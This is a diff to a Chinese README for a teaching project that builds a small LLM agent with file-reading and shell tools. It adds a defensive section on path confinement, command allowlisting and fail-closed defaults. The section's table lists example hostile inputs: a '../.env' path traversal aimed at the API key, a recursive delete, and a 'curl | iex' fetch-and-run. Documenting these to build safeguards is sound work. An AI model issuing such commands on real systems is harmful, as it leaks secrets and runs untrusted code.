@@ -21,9 +21,11 @@ mini-agent/
 │   ├── loop.py         # 核心循环 —— 记忆在这里
 │   └── tools/          # 【第 2 周】工具层
 │       ├── __init__.py
-│       ├── base.py     # 工具基类 + Schema 生成
-│       ├── registry.py # 注册表 + 自动发现
-│       └── get_time.py # 第一个工具
+│       ├── base.py       # 工具基类 + Schema 生成
+│       ├── registry.py   # 注册表 + 自动发现
+│       ├── get_time.py   # 工具 1：读系统时间（无副作用）
+│       ├── read_file.py  # 工具 2：读项目内文件（必须做路径校验）
+│       └── run_shell.py  # 工具 3：执行只读命令（必须做白名单）
 ├── cli.py              # 命令行入口
 └── .venv/              # 虚拟环境（uv 自动创建，不进 Git）
 ```
@@ -65,6 +67,26 @@ uv run python cli.py --tools     # 【第 2 周】交互模式 + 工具
 2. **不对公网暴露 Key**：不要把 `.env` 内容贴到任何聊天窗口或截图里。
 3. **每次请求都要有上限**：`max_tokens` 管钱，`timeout` 管时间。
 
+## 三层安全边界（第 2 周真正的内容）
+
+工具的 `parameters` 里的值是**模型生成的字符串**，不是你敲的。所以工具层必须假设
+「每个参数都可能有恶意」。
+
+| 层 | 手段 | 挡住什么 |
+|---|---|---|
+| 1 | 路径限制在项目目录内（`is_relative_to`） | `read_file("../../.env")` 读走 API Key |
+| 2 | 命令白名单（不是黑名单） | `del /s /q`、`curl xxx \| iex` |
+| 3 | 超时 + 固定工作目录 | 死循环命令、`C:\Windows` 里乱跑 |
+
+两个默认值的选择是本项目最该记住的一课：
+
+- **fail-closed**（默认拒绝）：安全逻辑没写出来 → 一律拒绝执行
+- **fail-open**（默认放行）：安全逻辑没写出来 → 全部放行
+
+`read_file` 最初的版本就是 fail-open 的：校验逻辑是空的，代码直接落到
+`target = PROJECT_ROOT / path`，结果模型一句 `read_file("../.env")` 就能读出你的 Key。
+**安全代码永远选「拒绝」那一侧。**
+
 ## 一个必须知道的坑：推理模型会「先思考再回答」
 
 本项目用的模型带思考模式，会先产出一段 `reasoning_content`。**思考也算 token，也吃 `max_tokens`。**
@@ -84,15 +106,20 @@ uv run python cli.py --tools     # 【第 2 周】交互模式 + 工具
   - [x] 多轮对话跑通（模型记得前两句）
   - [x] 流式输出跑通
   - [x] `/reset` 后确实失忆（验证「记忆 = messages 列表」）
-- [ ] **第 2 周**：`agent/tools/`，模型能自主调工具（v0.3）
+- [x] **第 2 周**：`agent/tools/`，模型能自主调工具（v0.3）
   - [x] `agent/tools/base.py` —— 工具基类 + Schema 生成
   - [x] `agent/tools/registry.py` —— 注册表 + 自动发现
   - [x] `agent/tools/get_time.py` —— 第一个工具
   - [x] `llm.py` 支持 `tools` 与 `tool_calls`
   - [x] `cli.py` 加 `--tools` 开关
-  - [ ] `loop.py` 的 `run_with_tools()`（3 处 TODO 待补）
-  - [ ] 问「现在几点」能自动调 `get_time`
-  - [ ] 坏 JSON 不崩溃
-  - [ ] `max_iterations` 能拦住死循环
+  - [x] `loop.py` 的 `run_with_tools()`（3 处 TODO 已补齐）
+  - [x] 问「现在几点」能自动调 `get_time`
+  - [x] 坏 JSON 不崩溃（`ToolCall.parsed_arguments()` 兜底）
+  - [x] `max_iterations` 能拦住死循环（实测调用 3 次即停）
+  - [ ] `read_file` 工具（TODO ①：路径校验未补）
+  - [ ] `run_shell` 工具（TODO ②：白名单未补）
+
+  > 两个工具在 TODO 补齐前都是**完全拒绝执行**的（fail-closed）。
+  > 这是故意的：安全相关的默认值永远选「拒绝」那一侧。
 - [ ] 第 3 周：会话持久化 + 上下文裁剪 + 长期记忆
 - [ ] 第 4 周：HTTP 接口 + 测试 + 打包
